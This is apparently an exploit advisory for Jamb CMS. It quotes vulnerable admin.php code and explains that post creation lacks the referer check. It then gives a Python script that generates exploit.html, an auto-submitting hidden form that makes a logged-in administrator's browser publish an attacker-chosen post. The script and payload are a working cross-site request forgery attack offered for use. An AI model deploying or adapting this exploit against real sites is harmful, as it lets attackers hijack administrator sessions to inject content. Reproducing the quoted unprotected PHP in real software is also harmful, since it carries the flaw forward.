Jamb CSRF Arbitrary Add a Post
==============================

# Jamb CMS CSRF Arbitrary add a post
#
# Jamb can be downloaded here: http://darkjoker.sytes.net/archives/jamb.zip
#
# Let&#039;s see the bugged code:
# ---- snip from admin.php -----
"""
    $id=intval ($_GET[&#039;id&#039;]);
    switch ($_GET[&#039;act&#039;]) {
        case &#039;del&#039;:
            $query = "DELETE FROM articles WHERE id = &#039;{$id}&#039;";
            mysql_query ($query) or die ("Please edit functions.php!");
            $query = "DELETE FROM comments WHERE pid = &#039;{$id}&#039;";
            mysql_query ($query);
            header ("Location: index.php");
            die ();
            break;
        case &#039;edit&#039;:
            $newtitle = htmlentities (mysql_real_escape_string ($_POST[&#039;newtitle&#039;]));
            $newart = mysql_real_escape_string ($_POST[&#039;newart&#039;]);
            if (!$newtitle || !$newart) {
                $query = "SELECT * FROM articles WHERE id = &#039;{$id}&#039;";
                $res=mysql_query ($query);
                $row=mysql_fetch_row ($res);
                if (!$row[0])
                    die ("Wrong ID");
                $row[1]=stripslashes($row[1]);
                $row[2]=stripslashes ($row[2]);
                echo    "<form action = &#039;admin.php?act=edit&id={$id}&#039; method = &#039;POST&#039;>\n".
                    "Title: <input name = &#039;newtitle&#039; value = &#039;{$row[1]}&#039;><br>\n".
                    "<textarea rows=30 cols=100 name=&#039;newart&#039;>{$row[2]}</textarea><br>\n".
                    "<input type = &#039;submit&#039; value = &#039;Edit&#039;><br>\n".
                    "</form>\n";
                    $a=false;
            }
            else {
                $query = "UPDATE articles SET title=&#039;{$newtitle}&#039;, body=&#039;{$newart}&#039; WHERE id = &#039;{$id}&#039;";
                mysql_query ($query);
                header ("Location: index.php");
                die ();
            }
            break;
        case &#039;delc&#039;:
            $query = "DELETE FROM comments WHERE id = &#039;{$id}&#039;";
            mysql_query ($query);
            header ("Location: index.php");
            die ();
            break;
        case &#039;editc&#039;:
            $newuname = htmlentities (mysql_real_escape_string ($_POST[&#039;newuname&#039;]));
            $newcomm = htmlentities (mysql_real_escape_string ($_POST[&#039;newcomm&#039;]));
            if (!$newuname || !$newcomm) {
                $query = "SELECT * FROM comments WHERE id = &#039;{$id}&#039;";
                $res = mysql_query ($query);
                $row = mysql_fetch_row ($res);
 
                if (!$row[0])
                    die ("Wrong ID");
                $row[2]=stripslashes ($row[2]);
                $row[3]=stripslashes ($row[3]);
                echo    "<form action = &#039;admin.php?act=editc&id={$id}&#039; method = &#039;POST&#039;>\n".
                    "Author: <input name = &#039;newuname&#039; value = &#039;{$row[2]}&#039;><br>\n".
                    "<textarea rows=10 cols=25 name = &#039;newcomm&#039;>{$row[3]}</textarea><br>\n".
                    "<input type = &#039;submit&#039; value = &#039;Edit&#039;><br>\n</form>\n";
                $a=false;
            }
            else {
                $query = "UPDATE comments SET author=&#039;{$newuname}&#039;, comment=&#039;{$newcomm}&#039; WHERE id=&#039;{$id}&#039;";
                mysql_query ($query);
                header ("Location: index.php");
                die ();
            }
            break;
        default:
            break;
    }
}
 
if (is_logged () && $a) {
    $title = htmlentities (mysql_real_escape_string ($_POST[&#039;title&#039;]));
    $art = mysql_real_escape_string ($_POST[&#039;data&#039;]);
    echo $title . " ".$art;
    if (!$title || !$art) {
        echo    "<form method = &#039;POST&#039;>\n".
            "Title: <input name = &#039;title&#039;><br>\n".
            "<textarea rows=30 cols=100 name = &#039;data&#039;></textarea><br>\n".
            "<input type = &#039;submit&#039; value = &#039;Send&#039;><br>\n".
            "</form>\n";
    }
    else {
        $query = "INSERT INTO articles (title,body,date) VALUES (&#039;{$title}&#039;,&#039;{$art}&#039;,&#039;".time()."&#039;);";
        mysql_query ($query);
        header ("Location: index.php");
        die ();
    }
}
"""
# ---- end snip ----
#
# How you can see, only the "act" part of code has the referer checked, this is useful (for us).
# We can exploit this issue by sending a specially .html file to the admin when he/she is logged.
#
# I write a little script for do this
 
 
from sys import argv
 
if len(argv) < 4:
    print "Usage: ./exploit.py <url_with_jamb_dir> <title> <content_of_post>"
    quit()
     
print ".:[Jamb CMS CSRF Arbitrary add post exploit]:.\n\n"
url = argv[1]
title = argv[2]
content = argv[3]
print "[+] Preparing the exploit"
skeleton = """
<body onload="document.getElementById(&#039;1&#039;).submit()">
<form method="POST" id="1" action="%s/admin.php">
<input type="hidden" name="title" value="%s">
<input type="hidden" name="data" value="%s">
</form>""" % (url, title, content)
enc = skeleton
print "[+] Writing the exploit"
fd = file("exploit.html", "w")
fd.write(enc)
fd.close()
print "[+] Done, check exploit.html"



